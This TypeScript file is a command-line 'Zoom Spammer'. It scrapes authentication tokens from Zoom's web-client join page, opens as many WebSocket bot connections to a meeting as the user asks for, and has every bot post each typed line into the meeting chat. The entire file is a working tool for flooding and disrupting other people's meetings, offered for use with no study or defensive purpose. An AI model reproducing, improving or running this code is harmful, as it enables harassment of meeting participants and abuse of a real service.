import axios from "axios";
import readline from "readline";
import btoa from "btoa";
import ws from "ws";
import chalk from "chalk";
import { Spinner } from "clui";

import { cliQuestions } from "./cli";

const clients: ws[] = [];

const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout,
    terminal: false
});

console.log(chalk.bold.yellow("Zoom Spammer 0.1 by Matthew_Cash"));

(async () => {
    const { code, name, count, password } = await cliQuestions();

    const progress = new Spinner("Connecting to Zoom", ["▖", "▘", "▝", "▗"]);
    progress.start();

    // This is the initial page request for zoom
    const page = await axios({
        method: "get",
        url: `https://zoom.us/wc/${code}/join?pwd=${password}`,
        headers: {
            Cookie: `wc_join=${code}*${name}; wc_dn=${name}; _zm_currency=USD; _zm_mtk_guid=1c56a76aaacb4028b1ad337c1a867bbd; _zm_lang=en-US; _zm_client_tz=America/Los_Angeles; _zm_cdn_blocked=unlog_unblk; _ga=GA1.2.1053826471.1585760799; _gid=GA1.2.1984667947.1585760799; wc_info=16800768%23290965%23B2F382A1-8D8A-43E7-861D-68121713ABE0%23%23test%230`
        }
    }).catch(error => {
        progress.stop();
        if (error.response.status === 403) {
            console.log("Error Connecting to Zoom (403 Forbidden)");
        } else {
            console.log("Make sure that the meeting code is correct");
        }
        process.exit(1);
    });

    // These next parts find the "ts" and "auth" tokens from inside the HTML document
    const document = page.data;

    const tsLocation = document.search("config.ts");
    const ts = document.substr(tsLocation).split("'")[1];

    const authLocation = document.search("config.auth");
    const auth = document.substr(authLocation).split('"')[1];

    console.log(auth, ts);

    // This gets another auth token (rwcAuth) using the previous auth tokens
    const rwcRes = await axios({
        method: "get",
        url: `https://rwcff.zoom.us/wc/ping/${code}?auth=${auth}&?ts=${ts}`
    }).catch(error => {
        progress.stop();
        if (error.response.status === 404) {
            console.log("Invalid Meeting Code!");
        } else {
            console.log(
                `Error Connecting to Zoom (Code ${error.response.status})`
            );
        }
        process.exit(1);
    });
    const host = rwcRes.data.rwg;
    const rwcAuth = rwcRes.data.rwcAuth;

    // Starts WS Clients using all of the data from before
    progress.message("Starting Bot Clients");

    rl.on("line", line => {
        console.log(`Sending: "${line}"`);
        clients.forEach(client => client.sendMessage(line));
    });

    while (clients.length < count) {
        await (async () => {
            const client = new ws(
                `wss://${host}/webclient/${code}?dn=${name}&ts=${ts}&auth=${auth}&rwcAuth=${rwcAuth}&mpwd=${password}`
            );
            clients.push(client);

            client.sendMessage = message => {
                client.send(
                    JSON.stringify({
                        evt: 4135,
                        body: {
                            text: btoa(message),
                            destNodeID: 0
                        },
                        seq: 13
                    })
                );
            };

            client.on("open", async () => {
                progress.stop();
                console.log("Connected!", clients.length);
            });
        })();
    }
})();
